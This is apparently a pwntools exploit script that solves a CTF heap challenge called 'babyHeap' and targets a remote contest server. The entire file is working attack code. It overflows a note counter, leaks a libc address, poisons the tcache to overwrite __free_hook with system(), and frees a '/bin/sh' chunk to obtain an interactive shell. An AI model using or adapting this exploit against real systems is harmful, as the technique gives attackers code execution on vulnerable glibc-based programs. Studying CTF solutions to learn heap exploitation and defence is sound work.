#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('babyHeap')
context.terminal = ['tmux', 'splitw', '-h']


#cmd = "./babyheap/ld-2.31.so --library-path /home/littlewho/ctfs/backdoor21/babyheap ./babyheap/babyHeap"
#cmd = cmd.split(" ")
cmd = ['./babyHeap']

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return process(cmd + argv, *a, **kw)
    return remote( 'hack.scythe2021.sdslabs.co', 17169 )

# -- Exploit goes here --

class App:
    def __init__(self, io):
        self.cnt = 0
        self.io = io

    def recv_menu(self):
        self.io.recvuntil(b'>>')

    def recv_prmt(self):
        try:
            self.io.recvuntil(b':', timeout=2)
        except:
            self.io.recvuntil(b"Hacking", timeout=2)
            print("Hacking detected!")

    def create_notes(self, n = 1, sz = 3):
        print(f"create {n} {sz} (cnt = {self.cnt})")
        self.recv_menu()
        self.io.sendline(b'1')
        self.recv_prmt()
        self.io.sendline(str(n).encode('ascii'))
        self.recv_prmt()
        self.recv_menu()
        self.io.sendline(str(sz).encode('ascii'))
        self.cnt += n

    def free_last_note(self):
        print(f"delete (cnt = {self.cnt})")
        self.recv_menu()
        self.io.sendline(b'2')
        if self.cnt > 0:
            self.cnt -= 1

    def edit_note(self, idx = 0, data = 'A'):
        print(f"edit {idx} {len(data)} {data} (cnt = {self.cnt})")
        self.recv_menu()
        self.io.sendline(b'3')
        self.recv_prmt()
        self.io.sendline(str(idx).encode('ascii'))
        self.recv_prmt()
        self.io.sendline(str(len(data)).encode('ascii'))
        self.io.send(data)

    def view_note(self, idx = 0):
        print(f"view {idx}")
        self.recv_menu()
        self.io.sendline(b'4')
        self.recv_prmt()
        self.io.sendline(str(idx).encode('ascii'))
        data = self.io.recvline()[1:]
        print(f"content: {data}")
        return data


io = start()

app = App(io)

# 0x55555555804c my libc
# 0x000015555551f04c other libc

print("0x55555555804c")

app.create_notes(5, 1) # cnt = 5
app.create_notes(1, 3) # cnt = 6

if args.GDB:
    gdb.attach(io, gdbscript="""
set *((int*)0x55555555804c) = 3
continue
    """)
else:
    app.create_notes(int(2**32) - 6 + 3, 4)

app.free_last_note()
app.free_last_note() # cnt = 4
addr = u64(app.view_note(4).strip().ljust(8, b"\x00")) - 2014176
log.success(f"libc leak: {hex(addr)}")

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = addr
target = libc.symbols['__free_hook']
log.info(f'target: {hex(target)}')

app.create_notes(4, 2) # cnt = 8
app.free_last_note() # cnt = 7
app.free_last_note() # cnt = 6
app.edit_note(6, p64(target))
app.create_notes(2, 2) # cnt = 8
app.edit_note(7, p64(libc.symbols['system']))

app.create_notes(2, 1)
app.edit_note(9, b"/bin/sh\x00")
app.free_last_note()

io.interactive()
